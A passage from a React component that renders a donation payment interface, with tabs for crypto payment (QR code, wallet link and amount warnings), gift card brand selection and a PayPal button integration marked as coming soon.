                      className="inline-flex items-center px-4 py-2 border border-gray-300 shadow-sm text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50"
                    >
                      <QrCodeIcon className="h-5 w-5 mr-2" />
                      {showQR ? 'Hide' : 'Show'} QR Code
                    </button>

                    {showQR && (
                      <div className="p-4 bg-white rounded-lg shadow">
                        <QRCode value={paymentDetails.pay_address} size={200} />
                      </div>
                    )}

                    {cryptoPaymentUrl && (
                      <a
                        href={cryptoPaymentUrl}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="inline-flex items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700"
                      >
                        Pay with {selectedCrypto.name} Wallet
                      </a>
                    )}
                  </div>

                  <div className="bg-yellow-50 border border-yellow-100 rounded-lg p-4">
                    <div className="flex items-start">
                      <ExclamationCircleIcon className="h-5 w-5 text-yellow-400 mt-0.5 mr-2" />
                      <div className="text-sm text-yellow-800">
                        <p className="font-medium">Important:</p>
                        <ul className="list-disc list-inside mt-1 space-y-1">
                          <li>Send exactly {paymentDetails.pay_amount} {paymentDetails.pay_currency.toUpperCase()}</li>
                          <li>Complete payment before expiration ({formatTimeLeft(paymentDetails.expiration_estimate_date)} left)</li>
                          <li>Only send {paymentDetails.pay_currency.toUpperCase()} to this address</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() => {
                      setPaymentDetails(null);
                      setCryptoPaymentUrl(null);
                      setShowQR(false);
                    }}
                    className="w-full inline-flex justify-center items-center px-4 py-2 border border-gray-300 text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50"
                  >
                    Create New Payment
                  </button>
                </div>
              )}
            </div>
          </Tab.Panel>

          {/* Gift Card Panel */}
          <Tab.Panel className="rounded-xl bg-white p-3">
            <div className="space-y-4">
              <div className="bg-gray-50 rounded-lg p-4">
                <h3 className="text-lg font-medium text-gray-900">Gift Card Payment</h3>
                <p className="mt-1 text-sm text-gray-600">
                  Donate using your gift card
                </p>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-6">
                {GIFT_CARD_BRANDS.map((brand) => (
                  <button
                    key={brand.id}
                    type="button"
                    onClick={() => setSelectedGiftCard(brand)}
                    className={`relative rounded-lg p-4 flex flex-col items-center justify-center gap-2 transition-all ${
                      selectedGiftCard.id === brand.id
                        ? `${brand.background} ${brand.textColor} ring-2 ring-offset-2 ring-${brand.background}`
                        : 'bg-gray-100 hover:bg-gray-200 text-gray-900'
                    }`}
                    title={brand.description}
                  >
                    <brand.icon className={`h-8 w-8 ${selectedGiftCard.id === brand.id ? brand.textColor : 'text-gray-700'}`} />
                    <span className="text-xs font-medium text-center">{brand.name}</span>
                  </button>
                ))}
              </div>

              <div className="text-sm text-gray-600 bg-blue-50 p-4 rounded-lg">
                <p><strong>Card Requirements:</strong></p>
                <ul className="list-disc list-inside mt-2 space-y-1">
                  <li>Amount limits: ${selectedGiftCard.minAmount} - ${selectedGiftCard.maxAmount}</li>
                  <li>{selectedGiftCard.description}</li>
                </ul>
              </div>

              {renderGiftCardPanel()}
            </div>
          </Tab.Panel>

          {/* PayPal Panel */}
          <Tab.Panel className="rounded-xl bg-white p-3">
            <div className="space-y-4">
              <div className="bg-gray-50 rounded-lg p-4">
                <h3 className="text-lg font-medium text-gray-900">PayPal Payment</h3>
                <p className="mt-1 text-sm text-gray-600">
                  {/* Securely donate using PayPal or credit/debit card */}
                  We're working on adding PayPal support. Please check back soon! Continue with Crypto/Gift Card
                  <br />
                  <button
                    type="button"
                    onClick={() => setSelectedTab(0)}
                    className="text-indigo-600 hover:text-indigo-700 mr-4"
                  >
                    Use Crypto
                  </button>
                  || 
                  <button
                    type="button"
                    onClick={() => setSelectedTab(1)}
                    className="text-indigo-600 hover:text-indigo-700 ml-4"
                  >
                    Use Gift Card
                  </button>
                </p>
              </div>

              <PayPalButtons
                style={{ layout: "vertical" }}
                createOrder={(data, actions) => {
                  return actions.order.create({
                    purchase_units: [
                      {
                        amount: {
                          value: amount,
                          currency_code: "USD"
                        },
                        description: `Donation to ${selectedOrg?.name || 'Charity'}`
                      }
                    ]
                  });
                }}
                onApprove={handlePayPalApproval}
                onError={(err) => {
                  onError(err);
                  logPaymentEvent('PayPal Payment Error', JSON.stringify(err));
                }}
              />
            </div>
          </Tab.Panel>
        </Tab.Panels>
      </Tab.Group>
    </div>
  )
}

export default PaymentProcessor